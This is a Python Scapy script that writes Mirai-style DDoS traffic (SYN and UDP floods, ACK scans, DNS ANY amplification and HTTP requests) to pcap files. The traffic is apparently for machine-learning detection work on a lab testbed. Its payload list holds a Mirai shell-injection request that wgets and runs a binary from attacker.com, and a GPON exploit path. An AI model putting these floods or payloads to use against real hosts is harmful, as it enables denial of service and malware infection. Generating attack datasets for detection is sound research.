#!/usr/bin/env python3
"""
MIRA Mirai-Style DDoS Attack Generator v2.0 - ML-Enhanced (SWITCH-SAFE)

Generates realistic Mirai-style DDoS attacks with temporal attack phases:
- Escalated attack patterns (warm-up → peak → waves → spikes)
- Temporal jitter and intensity variations
- CloudLab internal network IPs (10.10.x.x)
- Timestamp compression for high-speed replay
- SWITCH-SAFE: Only SYN, UDP, and ACK attacks (HTTP/DNS blocked by CloudLab switch)

Key improvements over v1:
- Attack phases (Warm-up scan, SYN peak, Mixed waves, Random spikes)
- Inter-packet jitter (realistic timing)
- Variable intensities (1.0x to 5.0x multipliers)
- Mirai payload signatures
- Better for ML training (feature diversity)
- Timestamp compression (--speedup) for accelerated replay
- CloudLab virtual switch compatibility (removed bidirectional HTTP/DNS)

Usage:
    python3 generate_mirai_attacks_v2.py --output attack_10M_v2.pcap --packets 10000000 --attack-type mixed

Author: MIRA - ML-Enhanced Attack Traffic Generation
"""

import argparse
import random
import struct
import time
from scapy.all import *
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether

# ============================================================================
# Attack Phase Definitions (temporal patterns for realistic DDoS)
# ============================================================================

class AttackPhase:
    """Defines a temporal attack phase with specific characteristics"""
    def __init__(self, name, duration_pct, syn_weight, udp_weight, http_weight,
                 dns_weight, ack_weight, intensity_multiplier, jitter_ms):
        self.name = name
        self.duration_pct = duration_pct  # Percentage of total time
        self.syn_weight = syn_weight
        self.udp_weight = udp_weight
        self.http_weight = http_weight
        self.dns_weight = dns_weight
        self.ack_weight = ack_weight  # ACK/probing scans
        self.intensity_multiplier = intensity_multiplier  # Traffic volume multiplier
        self.jitter_ms = jitter_ms  # Max jitter in milliseconds

    def get_attack_distribution(self):
        """Return attack type distribution for this phase"""
        return (['syn'] * self.syn_weight +
                ['udp'] * self.udp_weight +
                ['http'] * self.http_weight +
                ['dns'] * self.dns_weight +
                ['ack'] * self.ack_weight)


# Define realistic attack phases (simulates escalating DDoS attack)
# SWITCH-SAFE VERSION: HTTP and DNS removed (blocked by CloudLab virtual switch)
# Safe protocols: SYN (unidirectional), UDP (unidirectional), ACK scans
ATTACK_PHASES = [
    # Phase 1: Warm-up Scan (10% of time) - Reconnaissance
    AttackPhase(
        name="Warm-up Scan",
        duration_pct=10,
        syn_weight=30,    # 30% SYN scans
        udp_weight=20,    # 20% UDP probes (increased from 10)
        http_weight=0,    # 0% HTTP (BLOCKED BY SWITCH)
        dns_weight=0,     # 0% DNS (BLOCKED BY SWITCH)
        ack_weight=50,    # 50% ACK scans (reconnaissance)
        intensity_multiplier=0.3,  # Low intensity
        jitter_ms=200     # High jitter (slow probing)
    ),

    # Phase 2: SYN Flood Peak (40% of time) - Main attack
    AttackPhase(
        name="SYN Flood Peak",
        duration_pct=40,
        syn_weight=70,    # 70% SYN flood (main attack)
        udp_weight=28,    # 28% UDP flood (increased from 20)
        http_weight=0,    # 0% HTTP (BLOCKED BY SWITCH)
        dns_weight=0,     # 0% DNS (BLOCKED BY SWITCH)
        ack_weight=2,     # 2% ACK scans
        intensity_multiplier=5.0,  # Maximum intensity
        jitter_ms=5       # Low jitter (sustained blast)
    ),

    # Phase 3: Mixed Bot Waves (30% of time) - Distributed attack
    AttackPhase(
        name="Mixed Bot Waves",
        duration_pct=30,
        syn_weight=50,    # 50% SYN (increased from 35)
        udp_weight=45,    # 45% UDP (increased from 35)
        http_weight=0,    # 0% HTTP (BLOCKED BY SWITCH)
        dns_weight=0,     # 0% DNS (BLOCKED BY SWITCH)
        ack_weight=5,     # 5% ACK
        intensity_multiplier=3.0,  # High intensity
        jitter_ms=50      # Moderate jitter (wave patterns)
    ),

    # Phase 4: Random Spikes (20% of time) - Unpredictable bursts
    AttackPhase(
        name="Random Spikes",
        duration_pct=20,
        syn_weight=50,    # 50% SYN (increased from 40)
        udp_weight=40,    # 40% UDP (increased from 30)
        http_weight=0,    # 0% HTTP (BLOCKED BY SWITCH)
        dns_weight=0,     # 0% DNS (BLOCKED BY SWITCH)
        ack_weight=10,    # 10% ACK
        intensity_multiplier=2.0,  # Medium-high intensity
        jitter_ms=150     # High jitter (unpredictable timing)
    ),
]

# ============================================================================
# Mirai Payload Signatures (Real botnet fingerprints)
# ============================================================================

# Real Mirai HTTP payloads (from botnet analysis)
MIRAI_HTTP_PAYLOADS = [
    b"GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36\r\nConnection: keep-alive\r\n\r\n",
    b"GET /setup.cgi HTTP/1.1\r\nHost: %s\r\n\r\n",
    b"POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: %s\r\nContent-Length: 118\r\n\r\n",
    b"GET /shell?cd+/tmp;wget+http://attacker.com/bins/mirai.arm;chmod+777+*;sh+/tmp/mirai.arm HTTP/1.1\r\n\r\n",
]

# Mirai DNS amplification targets
MIRAI_DNS_QUERIES = [
    b"google.com", b"cloudflare.com", b"amazon.com", b"microsoft.com",
    b"facebook.com", b"apple.com", b"netflix.com", b"twitter.com"
]

# ============================================================================
# Packet Generation Functions (Enhanced with Mirai signatures)
# ============================================================================

def generate_flow_id():
    """Generate unique flow identifier"""
    return random.randint(100000, 999999)


def add_size_jitter(base_size, jitter_pct=0.2):
    """Add random jitter to packet size"""
    jitter = int(base_size * jitter_pct)
    return base_size + random.randint(-jitter, jitter)


def generate_syn_flood(src_ip, dst_ip, src_mac, dst_mac, phase):
    """Generate SYN flood packets with Mirai characteristics"""
    packets = []

    # Mirai targets common services
    target_ports = [80, 443, 22, 23, 2323, 37215, 52869, 5555]  # Real Mirai targets

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          TCP(sport=random.randint(1024, 65535),
              dport=random.choice(target_ports),
              flags='S',
              seq=random.randint(1000, 4000000000),
              window=random.choice([1024, 2048, 4096, 8192]))  # Realistic window sizes

    packets.append(pkt)
    return packets


def generate_udp_flood(src_ip, dst_ip, src_mac, dst_mac, phase):
    """Generate UDP flood with CICDDoS2019/Mirai characteristics"""
    packets = []

    # Mirai UDP flood: 516-byte payloads or DNS amplification
    payload_size = add_size_jitter(516, 0.1)  # CICDDoS2019 style
    payload_size = max(200, min(1200, payload_size))

    payload = bytes([random.randint(0, 255) for _ in range(payload_size)])

    # Random or DNS ports
    if random.random() < 0.3:  # 30% DNS amplification attempts
        dport = 53
    else:
        dport = random.randint(1024, 65535)

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          UDP(sport=random.randint(1024, 65535), dport=dport) / \
          Raw(load=payload)

    packets.append(pkt)
    return packets


def generate_http_flood(src_ip, dst_ip, src_mac, dst_mac, phase):
    """Generate HTTP flood with Mirai signatures"""
    packets = []

    sport = random.randint(49152, 65535)
    seq_client = random.randint(1000, 4000000000)
    seq_server = random.randint(1000, 4000000000)

    # TCP SYN
    syn = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          TCP(sport=sport, dport=80, flags='S', seq=seq_client)
    packets.append(syn)

    # TCP SYN-ACK
    synack = Ether(src=dst_mac, dst=src_mac) / \
             IP(src=dst_ip, dst=src_ip) / \
             TCP(sport=80, dport=sport, flags='SA', seq=seq_server, ack=seq_client + 1)
    packets.append(synack)

    # TCP ACK
    ack = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          TCP(sport=sport, dport=80, flags='A', seq=seq_client + 1, ack=seq_server + 1)
    packets.append(ack)

    # HTTP Request with Mirai signature
    # Format the payload by replacing %s with target IP (bytes formatting)
    http_req = random.choice(MIRAI_HTTP_PAYLOADS).replace(b"%s", dst_ip.encode())

    req = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          TCP(sport=sport, dport=80, flags='PA', seq=seq_client + 1, ack=seq_server + 1) / \
          Raw(load=http_req)
    packets.append(req)

    return packets


def generate_dns_flood(src_ip, dst_ip, src_mac, dst_mac, phase):
    """Generate DNS amplification attack"""
    packets = []

    sport = random.randint(49152, 65535)
    domain = random.choice(MIRAI_DNS_QUERIES)

    # DNS query (amplification target)
    # qtype=255 is DNS ANY query (use number instead of string for Scapy compatibility)
    query = Ether(src=src_mac, dst=dst_mac) / \
            IP(src=src_ip, dst=dst_ip) / \
            UDP(sport=sport, dport=53) / \
            DNS(rd=1, qd=DNSQR(qname=domain, qtype=255))  # 255 = ANY query for amplification
    packets.append(query)

    return packets


def generate_ack_scan(src_ip, dst_ip, src_mac, dst_mac, phase):
    """Generate ACK scan packets (reconnaissance)"""
    packets = []

    # Mirai reconnaissance ports
    scan_ports = [22, 23, 80, 443, 2323, 8080, 8888]

    pkt = Ether(src=src_mac, dst=dst_mac) / \
          IP(src=src_ip, dst=dst_ip) / \
          TCP(sport=random.randint(1024, 65535),
              dport=random.choice(scan_ports),
              flags='A',  # ACK scan (firewall probing)
              seq=random.randint(1000, 4000000000),
              ack=random.randint(1000, 4000000000))

    packets.append(pkt)
    return packets


# ============================================================================
# Main Generation Function with Temporal Attack Phases
# ============================================================================

def generate_mirai_attack_v2(output_file, num_packets, attack_type, intensity,
                             src_mac, dst_mac, attacker_range, target_ip,
                             num_attackers=200, speedup=1):
    """
    Generate Mirai-style DDoS attack with temporal phases and realistic variations

    Args:
        output_file: Output pcap file path
        num_packets: Total number of packets to generate
        attack_type: Type of attack ('mixed', 'syn', 'udp', 'http', 'dns', 'random')
        intensity: Attack intensity multiplier (1.0-5.0)
        src_mac: Source MAC address
        dst_mac: Destination MAC address
        attacker_range: Attacker IP range (e.g., "10.10.2.0/24")
        target_ip: Target server IP
        num_attackers: Number of attacker IPs (botnet size)
        speedup: Timestamp compression factor (e.g., 50 = 50x faster)
    """

    print("=" * 80)
    print("MIRA Mirai DDoS Attack Generator v2.0 - ML-Enhanced")
    print("=" * 80)
    print(f"Attack type:      {attack_type.upper()}")
    print(f"Intensity:        {intensity}x")
    print(f"Total packets:    {num_packets:,}")
    print(f"Output file:      {output_file}")
    print(f"Attacker range:   {attacker_range}")
    print(f"Target IP:        {target_ip}")
    print(f"Botnet size:      {num_attackers} IPs")
    print("")

    # Print phase information
    print("Attack Phases:")
    for i, phase in enumerate(ATTACK_PHASES, 1):
        phase_packets = int(num_packets * phase.duration_pct / 100 * intensity)
        print(f"  {i}. {phase.name:20s} - {phase.duration_pct:2d}% ({phase_packets:,} pkts) "
              f"- Intensity: {phase.intensity_multiplier:.1f}x, Jitter: {phase.jitter_ms}ms")
    print("")

    # Parse attacker IP range
    base_ip = attacker_range.split('/')[0]
    ip_parts = base_ip.split('.')
    base_ip_int = (int(ip_parts[0]) << 24) | (int(ip_parts[1]) << 16) | \
                  (int(ip_parts[2]) << 8) | int(ip_parts[3])

    # Generate attacker IPs (botnet)
    attacker_ips = []
    for i in range(num_attackers):
        attacker_ip_int = base_ip_int + (i % 256)
        attacker_ip = f"{(attacker_ip_int >> 24) & 0xFF}.{(attacker_ip_int >> 16) & 0xFF}." \
                     f"{(attacker_ip_int >> 8) & 0xFF}.{attacker_ip_int & 0xFF}"
        attacker_ips.append(attacker_ip)

    packets = []
    current_count = 0
    packets_per_update = max(1, num_packets // 100)  # Update every 1%

    # Initialize timestamp tracking
    current_timestamp = time.time()
    base_pkt_interval = 0.00003  # ~30 microseconds between packets (baseline)

    print("Starting attack packet generation with temporal phases...")
    print("")

    # Generate attack phase by phase
    for phase_idx, phase in enumerate(ATTACK_PHASES):
        phase_target = int(num_packets * phase.duration_pct / 100 * intensity)
        phase_start = current_count
        phase_distribution = phase.get_attack_distribution()

        print(f"Phase {phase_idx + 1}/{len(ATTACK_PHASES)}: {phase.name} "
              f"(target: {phase_target:,} packets)")

        while current_count - phase_start < phase_target:
            # Progress update
            if current_count > 0 and current_count % packets_per_update == 0:
                percent = min(100, current_count * 100 // num_packets)
                print(f"  Progress: {current_count:,}/{num_packets:,} ({percent}%)", flush=True)

            # Select random attacker (botnet distributed attack)
            attacker_ip = random.choice(attacker_ips)

            # Select attack type based on phase distribution or override
            if attack_type == 'mixed' or attack_type == 'random':
                selected_attack = random.choice(phase_distribution)
            else:
                selected_attack = attack_type

            # Generate attack packets based on type
            if selected_attack == 'syn':
                flow_packets = generate_syn_flood(attacker_ip, target_ip, src_mac, dst_mac, phase)
            elif selected_attack == 'udp':
                flow_packets = generate_udp_flood(attacker_ip, target_ip, src_mac, dst_mac, phase)
            elif selected_attack == 'http':
                flow_packets = generate_http_flood(attacker_ip, target_ip, src_mac, dst_mac, phase)
            elif selected_attack == 'dns':
                flow_packets = generate_dns_flood(attacker_ip, target_ip, src_mac, dst_mac, phase)
            elif selected_attack == 'ack':
                flow_packets = generate_ack_scan(attacker_ip, target_ip, src_mac, dst_mac, phase)
            else:
                # Fallback to SYN
                flow_packets = generate_syn_flood(attacker_ip, target_ip, src_mac, dst_mac, phase)

            # Apply realistic timestamps with phase-specific jitter
            for pkt in flow_packets:
                # Add jitter based on phase characteristics
                jitter_seconds = (random.random() - 0.5) * (phase.jitter_ms / 1000.0)

                # Adjust interval based on phase intensity
                interval = base_pkt_interval / (phase.intensity_multiplier * intensity)

                current_timestamp += interval + jitter_seconds
                pkt.time = current_timestamp

            packets.extend(flow_packets)
            current_count += len(flow_packets)

            # Stop if we've reached target
            if current_count >= num_packets:
                packets = packets[:num_packets]
                break

        print(f"  Phase {phase.name} complete: {current_count - phase_start:,} packets generated")
        print("")

    print(f"Total packets generated: {len(packets):,}")

    # Apply timestamp compression if requested
    if speedup > 1:
        print(f"\n[TIMESTAMP COMPRESSION] Applying {speedup}× speedup...")
        print(f"Original timeline will be compressed by factor {speedup}")

        first_time = packets[0].time
        compressed_count = 0

        for pkt in packets:
            original_time = pkt.time
            delta_from_start = original_time - first_time
            compressed_delta = delta_from_start / speedup
            pkt.time = first_time + compressed_delta
            compressed_count += 1

            if compressed_count % 1000000 == 0:
                print(f"  Compressed {compressed_count:,} timestamps...")

        original_duration = packets[-1].time - packets[0].time
        compressed_duration = original_duration / speedup

        print(f"\n[TIMESTAMP COMPRESSION] Complete:")
        print(f"  Original duration:    {original_duration * speedup:.2f} seconds")
        print(f"  Compressed duration:  {original_duration:.2f} seconds")
        print(f"  Speedup achieved:     {speedup}×")
        print(f"  Phases preserved:     ✓ Yes (just faster)")
        print("")

    # Write PCAP
    print(f"Writing packets to {output_file}...")
    wrpcap(output_file, packets)

    # Calculate file size
    import os
    file_size = os.path.getsize(output_file)
    print(f"File size: {file_size / (1024*1024):.2f} MB")
    print("")

    # Attack statistics
    print("Attack Distribution:")
    syn_count = sum(1 for p in packets if TCP in p and p[TCP].flags & 0x02)  # SYN flag
    udp_count = sum(1 for p in packets if UDP in p and DNS not in p)
    http_count = sum(1 for p in packets if TCP in p and Raw in p and b'HTTP' in bytes(p[Raw]))
    dns_count = sum(1 for p in packets if DNS in p)
    ack_count = sum(1 for p in packets if TCP in p and p[TCP].flags == 0x10)  # ACK only

    print(f"  SYN:   {syn_count:8,} packets ({syn_count*100//len(packets):2d}%)")
    print(f"  UDP:   {udp_count:8,} packets ({udp_count*100//len(packets):2d}%)")
    print(f"  HTTP:  {http_count:8,} packets ({http_count*100//len(packets):2d}%)")
    print(f"  DNS:   {dns_count:8,} packets ({dns_count*100//len(packets):2d}%)")
    print(f"  ACK:   {ack_count:8,} packets ({ack_count*100//len(packets):2d}%)")
    print("")

    # Timeline summary
    print("Timeline of Attack Phases:")
    cumulative = 0
    for i, phase in enumerate(ATTACK_PHASES, 1):
        phase_pct = phase.duration_pct
        cumulative += phase_pct
        print(f"  {i}. {phase.name:20s} @ {cumulative:3d}% - Intensity {phase.intensity_multiplier:.1f}x")
    print("")

    print("=" * 80)
    print("Attack generation complete!")
    print("=" * 80)
    print(f"✓ Ready for high-speed replay with dpdk_pcap_sender_v2 --adaptive")
    print("")

    return len(packets)


def main():
    parser = argparse.ArgumentParser(
        description='Generate Mirai-style DDoS attacks v2.0 - ML-Enhanced with temporal phases',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Phases (automatic):
  1. Warm-up Scan  (10%%) - Reconnaissance with ACK scans
  2. SYN Flood Peak (40%%) - Maximum intensity SYN flood
  3. Mixed Bot Waves (30%%) - Distributed multi-vector attack
  4. Random Spikes (20%%) - Unpredictable bursts

Features:
  - Temporal attack escalation (realistic DDoS progression)
  - Inter-packet jitter (not constant timing)
  - Mirai payload signatures (real botnet fingerprints)
  - Attack intensity variations (0.3x to 5.0x multipliers)
  - Timestamp compression (--speedup for faster replay)
  - CloudLab internal IPs (10.10.x.x)

Examples:
  # Mixed attack with default intensity (300s timeline):
  python3 generate_mirai_attacks_v2.py --packets 10000000 --output attack_10M_v2.pcap

  # High-intensity SYN flood, 50x faster (300s → 6s timeline):
  python3 generate_mirai_attacks_v2.py --packets 10000000 --attack-type syn --intensity 3.0 --speedup 50 --output attack_syn_fast.pcap

  # Mixed attack with CloudLab IPs:
  python3 generate_mirai_attacks_v2.py --packets 10000000 --attacker-range 10.10.2.0/24 --target-ip 10.10.1.2 --output attack_cloudlab.pcap
        """
    )

    parser.add_argument('--output', '-o', default='attack_mirai_10M_v2.pcap',
                       help='Output pcap file (default: attack_mirai_10M_v2.pcap)')
    parser.add_argument('--packets', '-n', type=int, default=10000000,
                       help='Number of packets to generate (default: 10000000)')
    parser.add_argument('--attack-type', '-t',
                       choices=['mixed', 'syn', 'udp', 'http', 'dns', 'random'],
                       default='mixed',
                       help='Attack type (default: mixed)')
    parser.add_argument('--intensity', type=float, default=1.0,
                       help='Attack intensity multiplier (1.0-5.0, default: 1.0)')
    parser.add_argument('--src-mac', default='00:00:00:00:00:02',
                       help='Source MAC address (default: 00:00:00:00:00:02)')
    parser.add_argument('--dst-mac', default='0c:42:a1:dd:5b:28',
                       help='Destination MAC address (default: 0c:42:a1:dd:5b:28)')
    parser.add_argument('--attacker-range', default='10.10.2.0/24',
                       help='Attacker IP range (default: 10.10.2.0/24 - CloudLab internal)')
    parser.add_argument('--target-ip', default='10.10.1.2',
                       help='Target server IP (default: 10.10.1.2 - CloudLab internal)')
    parser.add_argument('--attackers', type=int, default=200,
                       help='Number of attacker IPs (botnet size) (default: 200)')
    parser.add_argument('--speedup', '-s', type=float, default=1.0,
                       help='Timestamp compression factor (e.g., 50 = 50x faster timeline, default: 1 = no compression)')

    args = parser.parse_args()

    # Validate intensity
    if args.intensity < 1.0 or args.intensity > 5.0:
        print("Error: --intensity must be between 1.0 and 5.0")
        return -1

    # Validate speedup
    if args.speedup < 1.0:
        print("Error: --speedup must be >= 1.0")
        return -1

    generate_mirai_attack_v2(
        args.output,
        args.packets,
        args.attack_type,
        args.intensity,
        args.src_mac,
        args.dst_mac,
        args.attacker_range,
        args.target_ip,
        args.attackers,
        args.speedup
    )


if __name__ == '__main__':
    main()
